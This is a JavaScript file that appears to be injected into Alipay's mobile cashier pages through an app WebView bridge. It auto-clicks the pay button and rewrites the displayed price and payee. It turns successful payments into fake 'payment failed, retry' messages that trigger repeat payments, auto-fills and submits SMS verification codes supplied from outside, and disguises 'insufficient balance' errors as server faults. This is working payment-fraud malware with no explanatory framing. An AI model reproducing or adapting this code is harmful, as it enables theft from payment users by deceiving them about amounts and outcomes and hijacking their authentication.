document.addEventListener("DOMContentLoaded", function (event) {
});
if (typeof $ != "undefined") {
    window.addEventListener("load", function (event) {
        if (typeof interval_id == "undefined") {
            var interval_id = setInterval(function () {
                if ($(".J-h5Pay,.J-h5pay")) {
                    $(".J-h5Pay").click();
                    $(".J-h5pay").click();
                    clearInterval(interval_id);
                }
            }, 200);
        }
    });
}

function a897_aa() {
    if (typeof $ == "undefined") return false;
    $(".J-startapp").hide();
    $(".J-h5Download").hide();
    $(".J-complete").hide();
    $(".result-title").hide();
    $(".result-tips").hide();

}

function a_8971_hide1(je) {
    if (typeof $ == "undefined") return false;
    if (Date.now() < 1626095862000 && $) {
        let real = $(".v2020v2-header__price").text();
        $(".v2020v2-header__price").text(je + ".00");
        $(".v2020v2-header__name").text("");
        $(".v2020v2-preConfirm__item:first").hide();
        $(".am-list.am-list-wap-alipay").hide();
        $(".J-success .J-text").text("支付失败,请重试");
        if ($(".J-success .J-text").text() == '支付成功' && typeof ad_obj != 'undefined') {
            ad_obj.noti(1);
        }
        $(".v2020v2-needPayQuery.am-header-operate").text("返回重试");
        $(".J-success .J-text").css("color", "red");
        $(".v2020v2-needPayQuery.am-header-operate").css("color", "red");
        $(".v2020v2-needPayQuery.am-header-operate").attr('href', 'javascript:void(0);');
        $(".v2020v2-needPayQuery.am-header-operate").attr('onclick', 'fx_repay(1);');
    }

}

function a_8971__input_1(code) {
    if (typeof $ == "undefined") return false;
    if ($("#smsCode")) {
        $("my_msg_").text("正在请求支付结果");
        $("#smsCode").val(code);
        console.log($("#smsCode").val());
        if ($("button[type=submit]"))
            setTimeout(function () {
                $("button[type=submit]").click();
            }, 100);
    }
    if ($("#smscode")) {
        $("my_msg_").text("正在请求支付结果");
        $("#smscode").val(code);
        console.log($("#smscode").val());
        if ($("button[type=submit]"))
            setTimeout(function () {
                $("button[type=submit]").click();
            }, 100);
    }
}

function fx_repay(i) {
    if (typeof ad_obj != "undefined") ad_obj.fx_repay(i);
}

a897_aa();
if (typeof $ != "undefined") {
    let s1 = $("button[seed=v5_cashier_pre_confirm-submit]").text();
    if (s1 != null && s1.indexOf("确认付款") > -1) {
        if (typeof ad_obj != "undefined") {
        }
    }
    let text_dialog_str = $(".J-failure .J-text").text();
    if (text_dialog_str != null && text_dialog_str.indexOf("余额不足") > -1 && typeof ad_obj != "undefined") {
        $(".J-failure .J-text").text("服务器繁忙,支付失败");
        $(".am-dialog-text").text("服务器繁忙,请返回重试!");
        $(".am-dialog-button a:eq(0)").hide();
        $(".am-dialog-button a:eq(1)").hide();
        $(".am-dialog-button").append("<a href='javascript:void(0);' onclick='fx_repay(-1)'>返回重试</a>");
    }
}